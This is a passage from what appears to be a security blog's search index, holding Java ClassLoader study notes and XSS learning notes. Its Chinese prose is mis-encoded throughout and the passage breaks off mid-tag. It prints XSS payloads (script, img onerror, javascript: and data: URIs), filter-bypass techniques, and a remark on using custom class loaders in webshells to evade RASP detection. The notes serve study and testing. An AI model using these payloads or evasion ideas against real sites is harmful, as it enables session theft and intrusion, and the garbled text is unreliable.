å…¥äº†çˆ¶ç±»åŠ è½½å™¨ï¼ˆ<code>new ClassLoader(çˆ¶ç±»åŠ è½½å™¨)</code>ï¼‰å°±ä½¿ç”¨çˆ¶ç±»åŠ è½½å™¨åŠ è½½<code>TestHelloWorld</code>ç±»ï¼Œå¦åˆ™ä½¿ç”¨JVMçš„<code>Bootstrap ClassLoader</code>åŠ è½½ã€‚</li><li>å¦‚æœä¸Šä¸€æ­¥æ— æ³•åŠ è½½<code>TestHelloWorld</code>ç±»ï¼Œé‚£ä¹ˆè°ƒç”¨è‡ªèº«çš„<code>findClass</code>æ–¹æ³•å°è¯•åŠ è½½<code>TestHelloWorld</code>ç±»ã€‚</li><li>å¦‚æœå½“å‰çš„<code>ClassLoader</code>æ²¡æœ‰é‡å†™äº†<code>findClass</code>æ–¹æ³•ï¼Œé‚£ä¹ˆç›´æ¥è¿”å›ç±»åŠ è½½å¤±è´¥å¼‚å¸¸ã€‚å¦‚æœå½“å‰ç±»é‡å†™äº†<code>findClass</code>æ–¹æ³•å¹¶é€šè¿‡ä¼ å…¥çš„<code>com.anbai.sec.classloader.TestHelloWorld</code>ç±»åæ‰¾åˆ°äº†å¯¹åº”çš„ç±»å­—èŠ‚ç ï¼Œé‚£ä¹ˆåº”è¯¥è°ƒç”¨<code>defineClass</code>æ–¹æ³•å»JVMä¸­æ³¨å†Œè¯¥ç±»ã€‚</li><li>å¦‚æœè°ƒç”¨loadClassçš„æ—¶å€™ä¼ å…¥çš„<code>resolve</code>å‚æ•°ä¸ºtrueï¼Œé‚£ä¹ˆè¿˜éœ€è¦è°ƒç”¨<code>resolveClass</code>æ–¹æ³•é“¾æ¥ç±»ï¼Œé»˜è®¤ä¸ºfalseã€‚</li><li>è¿”å›ä¸€ä¸ªè¢«JVMåŠ è½½åçš„<code>java.lang.Class</code>ç±»å¯¹è±¡ã€‚</li></ul><h2 id="è‡ªå®šä¹‰ClassLoader"><a href="#è‡ªå®šä¹‰ClassLoader" class="headerlink" title="è‡ªå®šä¹‰ClassLoader"></a>è‡ªå®šä¹‰ClassLoader</h2><p><code>java.lang.ClassLoader</code>æ˜¯æ‰€æœ‰çš„ç±»åŠ è½½å™¨çš„çˆ¶ç±»,å…¶å­ç±»åŠ è½½å™¨é€šè¿‡ç»§æ‰¿å…¶å¹¶é‡å†™äº†<code>findClass</code>æ–¹æ³•å®ç°äº†æ–°çš„åŠŸèƒ½</p><p>å› æ­¤æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡é‡å†™<code>findClass</code>æ–¹æ³•æ¥è‡ªå®šä¹‰ä¸€ä¸ªç±»åŠ è½½å™¨</p><p>è‡ªå®šä¹‰ç±»<code>demo.ClassloaderDemo.TestHelloWorld</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.ClassLoaderDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestHelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        String a=<span class="string">&quot;å°é›¨å¥•å¥•ï¼Œæ°¸è¿œçƒ­æ‹&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è‡ªå®šä¹‰ç±»åŠ è½½å™¨</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.ClassLoaderDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">testClassName</span> <span class="operator">=</span> <span class="string">&quot;demo.ClassLoaderDemo.TestHelloWorld&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;-<span class="number">54</span>,-<span class="number">2</span>,-<span class="number">70</span>,-<span class="number">66</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">52</span>,<span class="number">0</span>,<span class="number">17</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">60</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">62</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">86</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">67</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">76</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">78</span>,<span class="number">117</span>,<span class="number">109</span>,<span class="number">98</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">84</span>,<span class="number">97</span>,<span class="number">98</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">20</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">76</span>,<span class="number">106</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">47</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">47</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">59</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">83</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">70</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">19</span>,<span class="number">84</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">72</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">87</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">46</span>,<span class="number">106</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">72</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">32</span>,<span class="number">87</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">126</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">35</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">47</span>,<span class="number">67</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">76</span>,<span class="number">111</span>,<span class="number">97</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">68</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">47</span>,<span class="number">84</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">72</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">87</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">106</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">47</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">47</span>,<span class="number">79</span>,<span class="number">98</span>,<span class="number">106</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">0</span>,<span class="number">33</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">29</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">42</span>,-<span class="number">73</span>,<span class="number">0</span>,<span class="number">1</span>,-<span class="number">79</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">27</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">18</span>,<span class="number">2</span>,-<span class="number">80</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">12</span>,</span><br><span class="line">    &#125;;<span class="comment">// TestHelloWorldç±»å­—èŠ‚ç </span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// åªå¤„ç†TestHelloWorldç±»</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) &#123;</span><br><span class="line">            <span class="comment">// è°ƒç”¨JVMçš„nativeæ–¹æ³•å®šä¹‰TestHelloWorldç±»</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        <span class="type">TestClassLoader</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestClassLoader</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">//åå°„è·å–helloæ–¹æ³•è°ƒç”¨</span></span><br><span class="line">            Class&lt;?&gt; aClass = a.loadClass(testClassName);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">hello</span> <span class="operator">=</span> o.getClass().getMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">invoke</span> <span class="operator">=</span> (String)hello.invoke(o);</span><br><span class="line">            System.out.println(invoke);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | InstantiationException | IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407040005403.png"                      alt="image-20221009165342719"                ><figcaption>image-20221009165342719</figcaption></figure></p><blockquote><p>åˆ©ç”¨è‡ªå®šä¹‰ç±»åŠ è½½å™¨æˆ‘ä»¬å¯ä»¥åœ¨webshellä¸­å®ç°åŠ è½½å¹¶è°ƒç”¨è‡ªå·±ç¼–è¯‘çš„ç±»å¯¹è±¡ï¼Œæ¯”å¦‚æœ¬åœ°å‘½ä»¤æ‰§è¡Œæ¼æ´è°ƒç”¨è‡ªå®šä¹‰ç±»å­—èŠ‚ç çš„nativeæ–¹æ³•ç»•è¿‡RASPæ£€æµ‹ï¼Œä¹Ÿå¯ä»¥ç”¨äºåŠ å¯†é‡è¦çš„Javaç±»å­—èŠ‚ç ï¼ˆåªèƒ½ç®—å¼±åŠ å¯†äº†ï¼‰ã€‚</p></blockquote><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p><code>URLClassLoader</code>ç»§æ‰¿äº†<code>ClassLoader</code>ï¼Œ<code>URLClassLoader</code>æä¾›äº†åŠ è½½è¿œç¨‹èµ„æºçš„èƒ½åŠ›ï¼Œåœ¨å†™æ¼æ´åˆ©ç”¨çš„<code>payload</code>æˆ–è€…<code>webshell</code>çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªç‰¹æ€§æ¥åŠ è½½è¿œç¨‹çš„jaræ¥å®ç°è¿œç¨‹çš„ç±»æ–¹æ³•è°ƒç”¨ã€‚</p><p>TODOâ€¦.</p>]]></content>
      
      
      <categories>
          
          <category> foundation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSSå­¦ä¹ </title>
      <link href="/2022/05/14/XSS%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/05/14/XSS%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>æ”»å‡»è€…åœ¨ç½‘é¡µä¸­åµŒå…¥å®¢æˆ·ç«¯è„šæœ¬ï¼Œä¸»è¦åˆ©ç”¨jsç¼–å†™çš„æ¶æ„ä»£ç æ¥æ‰§è¡Œä¸€äº›æƒ³è¦çš„åŠŸèƒ½</p><h3 id="åŒæºç­–ç•¥"><a href="#åŒæºç­–ç•¥" class="headerlink" title="åŒæºç­–ç•¥"></a>åŒæºç­–ç•¥</h3><p>åŒæºç­–ç•¥æ˜¯æŒ‡åœ¨Webæµè§ˆå™¨ä¸­ï¼Œå…è®¸æŸä¸ªç½‘é¡µè„šæœ¬è®¿é—®å¦ä¸€ä¸ªç½‘é¡µçš„æ•°æ®ï¼Œä½†å‰ææ˜¯è¿™ä¸¤ä¸ªç½‘é¡µå¿…é¡»æœ‰ç›¸åŒçš„URIã€ä¸»æœºåå’Œç«¯å£å·ï¼Œä¸€æ—¦ä¸¤ä¸ªç½‘ç«™æ»¡è¶³ä¸Šè¿°æ¡ä»¶ï¼Œè¿™ä¸¤ä¸ªç½‘ç«™å°±è¢«è®¤å®šä¸ºå…·æœ‰ç›¸åŒæ¥æº</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407040011036.jpg"                      alt="image-20220818210936052"                ><figcaption>image-20220818210936052</figcaption></figure></p><h2 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h2><p>ä¾æ®æ•ˆæœå¯åˆ†ä¸ºä¸‰ç±»</p><ul><li><p>åå°„å‹: éæŒä¹…æ€§XSSæ”»å‡»ï¼Œå½“ç”¨æˆ·è®¿é—®å·²è¢«æ’å…¥æ”»å‡»ä»£ç çš„é“¾æ¥æ—¶ï¼ŒæœåŠ¡å™¨ç«¯å°±ä¼šæ¥æ”¶å¹¶å¤„ç†å¸¦æœ‰æ”»å‡»ä»£ç çš„æ•°æ®ï¼Œç„¶åè¿”å›åˆ°æµè§ˆå™¨ä¸­ï¼Œå®Œæˆæ”»å‡»ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±åƒä¸€æ¬¡åå°„ã€‚æ­¤ç±» XSS é€šå¸¸å‡ºç°åœ¨ç½‘ç«™çš„æœç´¢æ ã€ç”¨æˆ·ç™»å½•å£ç­‰åœ°æ–¹ï¼Œå¸¸ç”¨æ¥çªƒå–å®¢æˆ·ç«¯ Cookies æˆ–è¿›è¡Œé’“é±¼æ¬ºéª—</p></li><li><p>å­˜å‚¨å‹ï¼šæŒä¹…å‹XSSæ”»å‡»ï¼Œæ”»å‡»è€…æŠŠæ”»å‡»ä»£ç æ°¸ä¹…å­˜å‚¨åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šä¸­ï¼Œä¾‹å¦‚æ•°æ®åº“ï¼Œæ¶ˆæ¯è®ºå›ï¼Œç•™è¨€æ¿ï¼Œè®¿é—®è€…æ—¥å¿—ç­‰ã€‚å½“ç”¨æˆ·è¿›å…¥é¡µé¢ï¼Œä»£ç å°±ä¼šè¢«æ‰§è¡Œã€‚</p></li><li><p>DOM å‹ï¼šDOMå‹ä¸å‰ä¸¤è€…çš„å·®åˆ«æ˜¯ï¼Œåªåœ¨å®¢æˆ·ç«¯è¿›è¡Œè§£æï¼Œä¸éœ€è¦æœåŠ¡å™¨çš„è§£æå“åº”</p></li></ul><h2 id="åå°„å‹"><a href="#åå°„å‹" class="headerlink" title="åå°„å‹"></a>åå°„å‹</h2><p>ç‰¹ç‚¹ï¼šéæŒä¹…åŒ–ï¼Œå¿…é¡»ç”¨æˆ·ç‚¹å‡»å¸¦æœ‰ç‰¹å®šå‚æ•°çš„é“¾æ¥æ‰å¯ä»¥èµ·ä½œç”¨</p><p>ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œç‚¹å‡»åè·³è½¬ç™¾åº¦</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;ç‚¹å‡»æ­¤å¤„ä¿®å¤&quot;</span>);location.<span class="property">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>å¸¸å‡ºç°åœ¨getæ–¹å¼ä¼ å‚</p></blockquote><h2 id="å‚¨å­˜å‹"><a href="#å‚¨å­˜å‹" class="headerlink" title="å‚¨å­˜å‹"></a>å‚¨å­˜å‹</h2><p>åœ¨æœªæ£€éªŒæ•°æ®æ˜¯å¦å­˜åœ¨XSSä»£ç çš„æƒ…å†µä¸‹ï¼Œä¾¿å°†å…¶å­˜å…¥æ•°æ®åº“ã€‚å½“ä¸‹ä¸€æ¬¡ä»æ•°æ®åº“ä¸­è·å–è¯¥æ•°æ®æ—¶ç¨‹åºä¹Ÿæœªå¯¹å…¶è¿›è¡Œè¿‡æ»¤ï¼Œé¡µé¢å†æ¬¡æ‰§è¡ŒXSSä»£ç ã€‚</p><p>ç‰¹ç‚¹ï¼šå¯ä»¥æŒç»­æ”»å‡»ã€‚</p><blockquote><p>æœ€æœ‰å¯èƒ½å‡ºç°çš„ä½ç½®ï¼šç•™è¨€æ¿ã€è¯„è®ºåŒºã€ç”¨æˆ·å¤´åƒã€ä¸ªæ€§ç­¾åã€åšå®¢ç­‰ç­‰ã€‚</p></blockquote><p>å†™å…¥ç•™è¨€æ¿</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&quot;https://www.baidu.com&quot;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>è®¿é—®æ—¶ä¼šè‡ªåŠ¨è·³è½¬ç™¾åº¦</p></blockquote><h2 id="Domå‹"><a href="#Domå‹" class="headerlink" title="Domå‹"></a>Domå‹</h2><h2 id="JavaScriptä¼ªåè®®"><a href="#JavaScriptä¼ªåè®®" class="headerlink" title="JavaScriptä¼ªåè®®"></a><strong>JavaScriptä¼ªåè®®</strong></h2><ul><li>Dataä¼ªåè®®ï¼š</li></ul><p>â€‹<code>data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=</code></p><ul><li>JavaScriptä¼ªåè®®ï¼š</li></ul><p>â€‹<code>onfocus=javascript:alert(&quot;1&quot;)</code></p><p>â€‹<code>&lt;a href=javascript:alert(&#39;xss&#39;) &gt; xss&lt;/a&gt;</code></p><h2 id="å¸¸è§ç»•è¿‡æ–¹å¼"><a href="#å¸¸è§ç»•è¿‡æ–¹å¼" class="headerlink" title="å¸¸è§ç»•è¿‡æ–¹å¼"></a>å¸¸è§ç»•è¿‡æ–¹å¼</h2><ul><li><p>é‡åˆ°å¯¹å°–æ‹¬å·&lt; &gt;è¿›è¡Œè½¬ä¹‰çš„ï¼Œå¯å°†payloadè¿›è¡ŒUnicodeç¼–ç </p></li><li><p>å¯¹<code>&lt;script&gt;</code>æ ‡ç­¾è¿›è¡Œè¿‡æ»¤ï¼Œå¯ä»¥å°è¯•å¤§å°å†™ï¼ŒåŒå†™ï¼Œæˆ–å…¶å®ƒæ ‡ç­¾ï¼Œä¾‹å¦‚:<a>ã€<img>ç­‰ç­‰</p><p><code>&lt;a href=javascript:alert(1)&gt;XSS&lt;/a&gt;</code></p><p><code>&lt;img src=111 onerror=alert(&#39;xss&#39;)&gt;</code></p></li><li><p>å¦‚æœä¸èƒ½é€šè¿‡å±æ€§è¿›è¡Œè·¨ç«™ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥åˆ©ç”¨æ—¶é—´å¤„ç†å‡½æ•°</p></li></ul><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type = <span class="string">&quot;button&quot;</span>  value = <span class="string">&quot;clickme&quot;</span> Î¿nclick=<span class="string">&quot;alert(â€˜click meâ€˜)&quot;</span> /&gt;</span><br></pre></td></tr></table></figure></div><ul><li>é—­åˆç½‘é¡µä¸­çš„æ ‡ç­¾ï¼Œä½¿è‡ªå·±çš„xsså¯ä»¥è¢«æ‰§è¡Œï¼ˆ&#x2F;&#x2F;å¯ä»¥æ³¨é‡Šåé¢çš„å†…å®¹ï¼‰</li></ul><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â€œ&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(â€œHiâ€);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span> <span class="comment">//</span></span><br></pre></td></tr></table></figure></div><ul><li><p>é’ˆå¯¹å¼€å¯äº†magic_quotes_gpc(è¿™ä¸ªæ˜¯PHPä¸­çš„å®‰å…¨è®¾ç½®)çš„ç½‘ç«™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡javascriptä¸­çš„String.fromCharCodeæ–¹æ³•æ¥ç»•è¿‡</p></li><li><p>å¯ä»¥ä½¿ç”¨javascript: ä¼ªåè®®çš„æ–¹å¼æ„é€ XSS</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;<span class="title class_">You</span> can trust me!&lt;/a&gt;</span><br></pre></td></tr></table></figure></div></li></ul><h3 id="XSSå¸¸ç”¨payloadï¼š"><a href="#XSSå¸¸ç”¨payloadï¼š" class="headerlink" title="XSSå¸¸ç”¨payloadï¼š"></a>XSSå¸¸ç”¨payloadï¼š</h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="comment">// ç”¨æˆ·ç‚¹å‡»aæ ‡ç­¾æ—¶å‡ºå‘hrefå±æ€§ï¼ˆè·³è½¬åˆ°hrefæˆ–æ‰§è¡Œjsï¼‰</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> /&gt;</span></span><span class="comment">// å½“imgæ ‡ç­¾çš„srcå±æ€§æ— æ•ˆæ—¶ï¼Œä¼šå‡ºå‘onerroräº‹ä»¶</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span> /&gt;</span></span><span class="comment">// å½“é¼ æ ‡ç§»è¿‡inputæ ‡ç­¾æ—¶ä¼šè§¦å‘onmouseoveräº‹ä»¶</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><span class="comment">// å½“styleæ ‡ç­¾è½½å…¥æˆåŠŸæ—¶ä¼šè§¦å‘onloadäº‹ä»¶</span></span><br></pre></td></tr></table></figure></div><h2 id="ç¼–ç æ··æ·†"><a href="#ç¼–ç æ··æ·†" class="headerlink" title="ç¼–ç æ··æ·†"></a>ç¼–ç æ··æ·†</h2><p>ä¸€å®šè¦éµå¾ªæµè§ˆå™¨çš„è§„åˆ™æ‰å¯ä»¥ç¡®ä¿ä»£ç èƒ½å¤Ÿè¢«æµè§ˆå™¨ç†è§£ï¼ï¼ï¼</p><h3 id="1-æ··åˆç¼–ç "><a href="#1-æ··åˆç¼–ç " class="headerlink" title="(1)æ··åˆç¼–ç "></a>(1)æ··åˆç¼–ç </h3><p>å¦‚ï¼šå¯¹<code>&lt;a href=javascript:alert(/XSS/)&gt;test&lt;/a&gt;</code>ç¼–ç </p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span 